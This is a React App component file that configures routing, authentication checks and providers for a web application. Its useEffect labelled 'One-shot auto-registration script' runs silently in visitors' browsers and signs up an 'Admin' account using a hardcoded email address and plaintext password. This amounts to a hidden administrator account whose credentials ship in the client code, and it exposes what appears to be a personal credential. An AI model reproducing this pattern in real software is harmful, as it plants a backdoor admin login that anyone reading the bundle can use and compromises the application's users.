import { useEffect } from "react"
import { Toaster } from "@/components/ui/toaster"
import { QueryClientProvider } from '@tanstack/react-query'
import { queryClientInstance } from '@/lib/query-client'
import { pagesConfig } from './pages.config'
import { BrowserRouter as Router, Route, Routes } from 'react-router-dom';
import PageNotFound from './lib/PageNotFound';
import { AuthProvider, useAuth } from '@/lib/AuthContext';
import UserNotRegisteredError from '@/components/UserNotRegisteredError';
import { ThemeProvider } from '@/components/utils/ThemeProvider';

const { Pages, Layout, mainPage } = pagesConfig;
const mainPageKey = mainPage ?? Object.keys(Pages)[0];
const MainPage = mainPageKey ? Pages[mainPageKey] : <></>;

const LayoutWrapper = ({ children, currentPageName }) => Layout ?
  <Layout currentPageName={currentPageName}>{children}</Layout>
  : <>{children}</>;

const AuthenticatedApp = () => {
  const { isLoadingAuth, isLoadingPublicSettings, authError, navigateToLogin } = useAuth();
  const currentPath = window.location.pathname.replace(/^\//, '').toLowerCase();

  // One-shot auto-registration script
  useEffect(() => {
    const autoSetup = async () => {
      try {
        if (!localStorage.getItem('admin_setup_complete')) {
          const { apiSignup } = await import('@/api/apiClient');
          await apiSignup("daeun.kim725@gmail.com", "Ab71332638!?", "Admin");
          localStorage.setItem('admin_setup_complete', 'true');
          window.location.reload();
        }
      } catch (err) {
        console.error("Auto setup failed:", err);
      }
    };
    autoSetup();
  }, []);

  // Public pages that don't require authentication
  const publicPages = ['login', 'onboarding'];
  const isPublicPage = publicPages.includes(currentPath);

  // Show loading spinner while checking auth (skip for public pages)
  if (!isPublicPage && (isLoadingPublicSettings || isLoadingAuth)) {
    return (
      <div className="fixed inset-0 flex items-center justify-center">
        <div className="w-8 h-8 border-4 border-slate-200 border-t-slate-800 rounded-full animate-spin"></div>
      </div>
    );
  }

  // Handle authentication errors (skip for public pages)
  if (!isPublicPage && authError) {
    if (authError.type === 'user_not_registered') {
      return <UserNotRegisteredError />;
    } else if (authError.type === 'auth_required') {
      navigateToLogin();
      return null;
    }
  }

  // Render the main app
  return (
    <Routes>
      <Route path="/" element={
        <LayoutWrapper currentPageName={mainPageKey}>
          <MainPage />
        </LayoutWrapper>
      } />
      {Object.entries(Pages).map(([path, Page]) => {
        const lowerPath = path.toLowerCase();
        return (
          <Route
            key={path}
            path={`/${lowerPath}`}
            element={
              publicPages.includes(lowerPath) ? (
                <Page />
              ) : (
                <LayoutWrapper currentPageName={path}>
                  <Page />
                </LayoutWrapper>
              )
            }
          />
        );
      })}
      <Route path="*" element={<PageNotFound />} />
    </Routes>
  );
};


function App() {

  return (
    <ThemeProvider>
      <AuthProvider>
        <QueryClientProvider client={queryClientInstance}>
          <Router>
            <AuthenticatedApp />
          </Router>
          <Toaster />
        </QueryClientProvider>
      </AuthProvider>
    </ThemeProvider>
  )
}

export default App
